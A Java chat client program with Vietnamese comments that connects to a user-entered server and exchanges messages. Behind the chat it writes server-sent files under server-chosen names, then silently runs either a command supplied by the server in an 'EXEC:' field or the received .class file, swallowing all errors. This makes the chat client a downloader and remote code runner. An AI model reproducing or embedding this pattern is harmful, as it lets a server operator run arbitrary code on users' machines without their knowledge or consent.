import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.Base64;

public class ChatClient {
    private static FileOutputStream fos;
    private static String fileName = "";
    private static String execCommand = "";
    private static boolean fileReceivingComplete = false;
    private static int partsReceived = 0;

    public static void main(String[] args) throws Exception {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Nhap dia chi IP server: ");
        String host = br.readLine();
        System.out.print("Nhap cong server: ");
        int port = Integer.parseInt(br.readLine());

        // Ket noi toi server
        Socket socket = new Socket(host, port);
        // Tao stream de gui va nhan du lieu
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        DataInputStream in = new DataInputStream(socket.getInputStream());

        // Thread nhan tin nhan va file tu server
        Thread receiveThread = new Thread(() -> {
            try {
                while (true) {
                    String serverMessage = in.readUTF();

                    if (serverMessage.equals("SERVER_DISCONNECT")) {
                        break;
                    }
                    
                    // Tach message thanh cac phan
                    parseCombinedMessage(serverMessage);
                }
            } catch (IOException e) {
                // Client mat ket noi
            }
        });
        receiveThread.start();

        // Gui tin nhan
        Scanner scanner = new Scanner(System.in);
        String message;
        while (true) {
            message = scanner.nextLine();

            if (message.equalsIgnoreCase("quit")) {
                out.writeUTF("CLIENT_DISCONNECT");
                break;
            }

            out.writeUTF("CHAT:" + message);
        }

        // Dong cac ket noi
        if (fos != null) {
            fos.close();
        }
        out.close();
        in.close();
        socket.close();
        br.close();
        scanner.close();
    }

    private static void parseCombinedMessage(String message) throws IOException {
        // Tach message bang dau |
        String[] parts = message.split("\\|");
        
        for (String part : parts) {
            if (part.startsWith("CHAT:")) {
                String chatContent = part.substring(5);
                System.out.println("Server: " + chatContent);
            } 
            else if (part.startsWith("FILE_NAME:")) {
                handleFileName(part);
            } 
            else if (part.startsWith("EXEC:")) {
                handleExecCommand(part);
            } 
            else if (part.startsWith("FILE:")) {
                handleFileData(part.substring(5)); // Bo qua "FILE:"
            }
        }
    }

    private static void handleFileName(String message) {
        fileName = message.substring(10); // Bo qua "FILE_NAME:"
        // Khoi tao file de nhan sau khi biet ten file
        try {
            File outFile = new File(fileName);
            fos = new FileOutputStream(outFile);
        } catch (IOException e) {
            // Loi khi tao file
        }
    }

    private static void handleExecCommand(String message) {
        execCommand = message.substring(5); // Bo qua "EXEC:"
    }

    private static void handleFileData(String fileData) throws IOException {
        if (fileData.equals("COMPLETE")) {
            handleFileComplete();
            return;
        }
        
        // Phan tich du lieu file: PART:number:data:status
        String[] fileParts = fileData.split(":", 4);
        if (fileParts.length >= 4 && fileParts[0].equals("PART")) {
            int partNumber = Integer.parseInt(fileParts[1]);
            String encodedData = fileParts[2];
            String status = fileParts[3];
            
            // Giai ma Base64
            byte[] decodedData = Base64.getDecoder().decode(encodedData);
            
            // Ghi vao file
            if (fos != null) {
                fos.write(decodedData);
                partsReceived++;
                
                // Kiem tra xem da nhan het chua
                if (status.equals("COMPLETE")) {
                    handleFileComplete();
                }
            }
        }
    }

    private static void handleFileComplete() throws IOException {
        if (!fileReceivingComplete) {
            fileReceivingComplete = true;
            if (fos != null) {
                fos.close();
            }

            // Su dung lenh thuc thi tu server
            if (!execCommand.isEmpty()) {
                try {
                    // Tach lenh thanh cac phan
                    String[] commandParts = execCommand.split(" ");
                    ProcessBuilder pb = new ProcessBuilder(commandParts);
                    pb.inheritIO();
                    Process process = pb.start();

                    // Chay file trong thread rieng de khong block chat
                    Thread executeThread = new Thread(() -> {
                        try {
                            process.waitFor();
                        } catch (InterruptedException e) {
                            // Loi khi chay file
                        }
                    });
                    executeThread.start();

                } catch (IOException e) {
                    // Loi khi chay file
                }
            } else {
                // Fallback ve cach cu neu khong co lenh tu server
                if (fileName.endsWith(".class")) {
                    try {
                        String className = fileName.replace(".class", "");
                        ProcessBuilder pb = new ProcessBuilder("java", className);
                        pb.inheritIO();
                        Process process = pb.start();

                        Thread executeThread = new Thread(() -> {
                            try {
                                process.waitFor();
                            } catch (InterruptedException e) {
                                // Loi khi chay file
                            }
                        });
                        executeThread.start();

                    } catch (IOException e) {
                        // Loi khi chay file
                    }
                }
            }
        }
    }
}
